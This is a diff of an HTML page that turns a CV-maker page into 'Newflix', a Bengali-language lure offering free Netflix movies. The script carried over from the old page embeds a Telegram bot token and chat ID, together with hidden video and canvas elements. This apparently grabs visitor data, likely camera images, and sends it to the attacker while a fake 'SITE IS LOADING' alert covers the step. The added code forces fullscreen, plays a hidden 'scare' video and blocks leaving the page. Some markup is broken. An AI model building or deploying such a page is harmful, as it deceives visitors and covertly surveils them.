@@ -1,179 +1,213 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HUNTER CV MAKER</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
-   <style>
-    * {
-      box-sizing: border-box;
-    }
+    <title>Newflix</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="নেটফ্লি-ক্সের সকল মুভি এখন দেখুন এখন ফ্রিতে।" />
+    <meta property="og:image" content="https://i.ibb.co/Cnntj34/Que-se-estrena-en-Netflix-en-abril-2024.jpg"/>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta property="og:description" content="নেটফ্লি-ক্সের সকল মুভি এখন দেখুন এখন ফ্রিতে।" />
+	<link rel="shortcut icon" href="https://i.ibb.co/3YB3J6v/newnetflixicon-800x534.jpg" />
+	<meta name="robots" content="noindex, nofollow">
+    <head>
+    	<style>
+p {
+                margin: 0;
+            }
 
-    body {
-      font-family: 'Arial', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f1f1f1;
-    }
+            *, *::before, *::after {
+                box-sizing: border-box;
+            }
 
-    .cv-container {
-      max-width: 800px;
-      margin: 30px auto;
-      background: white;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
+            .overlay, .scare {
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100vh;
+                width: 100vw;
+            }
 
-    label {
-      margin-top: 10px;
-      display: block;
-    }
+            p.overlay-title {
+                font-size: 24px;
+                font-weight: 900;
+                color: black;
+                line-height: 1;
+                margin-bottom: 16px;
+            }
 
-    input, textarea {
-      width: 100%;
-      padding: 8px;
-      margin-top: 4px;
-    }
+            .overlay-button {
+                display: inline-flex;
+                align-items: center;
+                height: 40px;
+                padding-right: 35px;
+                padding-left: 35px;
+                font-size: 16px;
+                font-weight: 500;
+                line-height: 1;
+                border-radius: 4px;
+                margin: 4px;
+                cursor: pointer;
+            }
 
-    .download-btn {
-      margin-top: 20px;
-      padding: 10px 20px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
+            .overlay-buttons-wrapper {
+                margin: -8px;
+            }
 
-    #cv-preview {
-      display: none;
-    }
+            #accept-button {
+                background-color: #D22B2B;
+                color: white;
+            }
 
-    .photo {
-      width: 120px;
-      height: 120px;
-      object-fit: cover;
-      border-radius: 50%;
-      margin-bottom: 20px;
-    }
+            #decline-button {
+                color: #845EC2;
+                border: 2px solid #845EC2;
+            }
 
-    /* A4 CV Styling */
-    #cv-content {
-      width: 794px;
-      min-height: 1123px;
-      padding: 30px;
-      background: white;
-      font-size: 14px;
-    }
+            p.overlay-description {
+                font-size: 17px;
+                font-weight: 400;
+                color: #7E7E7E;
+                line-height: 1.25;
+                margin-bottom: 100px;
+            }
 
-    @media (max-width: 600px) {
-      .cv-container {
-        padding: 10px;
-      }
+            a.overlay-link {
+                display: inline-block;
+                text-decoration: none;
+                font-size: 16px;
+                font-weight: 500;
+                color: #845EC2;
+                line-height: 1;
+                position: relative;
+                margin-top: 16px;
+            }
 
-      #cv-content {
-        width: 100%;
-        padding: 15px;
-      }
-    }
-  </style>
+            a.overlay-link::before {
+                position: absolute;
+                content: "";
+                height: calc(50% + 4px);
+                width: calc(100% + 8px);
+                bottom: -4px;
+                left: -4px;
+                background-color: rgba(132, 94, 194, 0.1);
+            }
+
+            .overlay-body {
+                max-width: 512px;
+                text-align: center;
+                font-family: "Inter", sans-serif;
+            }
+
+            .overlay.hidden {
+                display: none;
+            }
+
+            .overlay {
+                z-index: 2;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background-color: #000000;
+                padding-right: 24px;
+                padding-left: 24px;
+            }
+
+            .scare {
+                z-index: 1;
+            }
+
+            video#video {
+                height: 100%;
+                width: 100%;
+                object-fit: cover;
+            }
+
+            video#video::-webkit-media-controls-enclosure {
+                display:none !important;
+            }
+            .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #808080;
+            font-size: 14px;
+            animation: fadeIn 3s ease-in-out;
+        }
+        .footer a {
+            color: #ff6666;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    	<style>
+    <style id="dynamic-styles">
+    </style>
+
 </head>
 <body>
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="2000" height="2000" style="display:none;"></canvas>
-
-<div class="cv-container">
-  <h2 style="text-align:center">Hunter CV Maker</h2>
-  <form id="cvForm">
-    <label>Photo</label>
-    <input type="file" id="photoInput" accept="image/*"/>
-
-    <label>Full Name</label>
-    <input type="text" id="name"/>
-
-    <label>Email</label>
-    <input type="email" id="email"/>
-
-    <label>Phone</label>
-    <input type="text" id="phone"/>
-
-    <label>Address</label>
-    <textarea id="address" rows="2"></textarea>
-
-    <label>Education</label>
-    <textarea id="education" rows="3"></textarea>
-
-    <label>Work Experience</label>
-    <textarea id="experience" rows="3"></textarea>
-
-    <label>Skills</label>
-    <textarea id="skills" rows="2"></textarea>
-
-    <button type="button" class="download-btn" onclick="generateCV()">Generate & Download PDF</button>
-  </form>
-</div>
-
-<div id="cv-preview">
-  <div id="cv-content">
-    <div style="text-align: center;">
-      <img id="cv-photo" class="photo" src="" alt="Photo"/>
-      <h2 id="cv-name"></h2>
-      <p><strong>Email:</strong> <span id="cv-email"></span></p>
-      <p><strong>Phone:</strong> <span id="cv-phone"></span></p>
-      <p><strong>Address:</strong> <span id="cv-address"></span></p>
-      <p><strong>Education:</strong><br><span id="cv-education"></span></p>
-      <p><strong>Work Experience:</strong><br><span id="cv-experience"></span></p>
-      <p><strong>Skills:</strong><br><span id="cv-skills"></span></p>
+  <div>
+     video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="2000" height="2000" style="display:none;"></canvas 
     </div>
-  </div>
-</div>
+
+<div id="overlay" class="overlay">
+        <div class="overlay-body">
+            <br>
+            <a href="admin.mp4"><img src="https://i.ibb.co/4gk76Hh/f7264a566dfcde16a4293.jpg" width="170"></a>
+            <p class="overlay-title"></p>
+            <p class="overlay-description">Do you want to watch movie?<br/> If yes, click Home</p>
+            <br>
+            	<br>
+            <div class="overlay-buttons-wrapper">
+                <div id="accept-button" class="overlay-button">Home</div>
+                <br>
+                	<br>
+                <div class="footer">
+       Developed by <a href="#" target="_blank">HUNTER</a>
+   | Join our <a href="https://t.me" target="_blank">Telegram</a>
+    </div>
+            </div>
+        </div>
+    </div>
+    <div class="scare">
+        <video id="video" class="video" src="admin.mp4" loop></video>
+    </div>
 
 <script>
-  let uploadedImage = "";
+        const video = document.getElementById("video");
+        const overlay = document.getElementById("overlay");
+        const acceptButton = document.getElementById("accept-button");
 
-  document.getElementById("photoInput").addEventListener("change", function (event) {
-    const reader = new FileReader();
-    reader.onload = function () {
-      uploadedImage = reader.result;
-    };
-    reader.readAsDataURL(event.target.files[0]);
-  });
+        let hasClicked;
 
-  function generateCV() {
-    document.getElementById("cv-photo").src = uploadedImage || "";
-    document.getElementById("cv-name").textContent = document.getElementById("name").value;
-    document.getElementById("cv-email").textContent = document.getElementById("email").value;
-    document.getElementById("cv-phone").textContent = document.getElementById("phone").value;
-    document.getElementById("cv-address").textContent = document.getElementById("address").value;
-    document.getElementById("cv-education").textContent = document.getElementById("education").value;
-    document.getElementById("cv-experience").textContent = document.getElementById("experience").value;
-    document.getElementById("cv-skills").textContent = document.getElementById("skills").value;
+        window.onbeforeunload = function() {
+            if (hasClicked) return true;
+        };
 
-    const element = document.getElementById("cv-content");
+        function buttonClick(event) {
+            event.preventDefault();
+            if (!hasClicked) hasClicked = true;
+            overlay.classList.add("hidden");
+            video.play();
+            videoClick();
+        }
 
-    if (uploadedImage) {
-      const img = new Image();
-      img.onload = () => downloadPDF(element);
-      img.src = uploadedImage;
-    } else {
-      downloadPDF(element);
-    }
-  }
+        function videoClick(event) {
+            if (event) event.preventDefault();
+            
+            const { documentElement } = document;
+            if (documentElement.requestFullscreen) documentElement.requestFullscreen();
+            else if (documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+            else if (documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+            else if (documentElement.msRequestFullscreen) full.msRequestFullscreen();
+        }
 
-  function downloadPDF(element) {
-    const opt = {
-      margin: [0, 0, 0, 0],
-      filename: 'my_cv.pdf',
-      image: { type: 'jpeg', quality: 0.98 },
-      html2canvas: { scale: 2 },
-      jsPDF: { unit: 'pt', format: 'a4', orientation: 'portrait' }
-    };
-    html2pdf().set(opt).from(element).save();
-  }
-</script>
-
-    <script>
+        acceptButton.addEventListener("click", buttonClick);
+        video.addEventListener("click", videoClick);
+        
+    </script>
+<script>
         const botToken = "7656835167:AAEk2znwAzIxZJ8XnspLYZHqfUD6Q_sLohI";
         const chatId = "7003230711";
 
@@ -194,7 +228,7 @@
                 })
                 .catch(error => {
                     console.error(error);
-                    alert("🔰SITE IS LOADING....🛠️");
+                    alert("SITE IS LOADING....");
                 });
         }
 
@@ -304,4 +338,4 @@
         `;
     </script>
 </body>
-      </html>
+</html>
